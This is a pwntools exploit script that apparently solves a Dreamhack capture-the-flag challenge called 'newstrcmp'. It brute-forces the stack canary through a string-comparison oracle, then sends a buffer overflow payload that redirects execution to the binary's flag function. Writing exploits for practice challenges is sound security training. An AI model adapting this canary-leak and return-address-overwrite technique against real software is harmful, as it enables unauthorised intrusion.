#!/usr/bin/env python3

from pwn import *

exe = ELF("./newstrcmp")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 11033)

    return r


def try_compare(r, s1, s2):
    r.sendafter(b"Exit? (y/n): ", b"n")
    r.sendafter(b"Input string s1: ", s1)
    r.sendafter(b"Input string s2: ", s2)
    return r.recvline().decode()

def main():
    r = conn()

    p = log.progress("Canary Brute-forcing")
    canary = b"\x00"

    for i in range(6):
        for j in range(1, 256):
            s1 = b"A"*(25 + i) + p8(j)
            s2 = b"A"*(25 + i)
            response = try_compare(r, s1, s2)
            if "same" in response:
                canary += p8(j)
                p.status(f"Found: {canary.hex()}")
                break

    for j in range(1, 256):
        s1 = b"A"*31 + p8(j)
        s2 = b"A"*31
        response = try_compare(r, s1, s2)
        if "differs" in response:
            diff_idx = int(response.split()[-1])
            if diff_idx > 31:
                canary += p8(j)
                p.success(f"Complete! Canary: {hex(u64(canary))}")
                break
    
    payload = b"A" * 24
    payload += canary
    payload += b"A" * 8
    payload += p64(exe.symbols["flag"])

    try_compare(r, b"DUMMY", payload)

    r.sendafter(b"Exit? (y/n): ", b"y")
    r.interactive()


if __name__ == "__main__":
    main()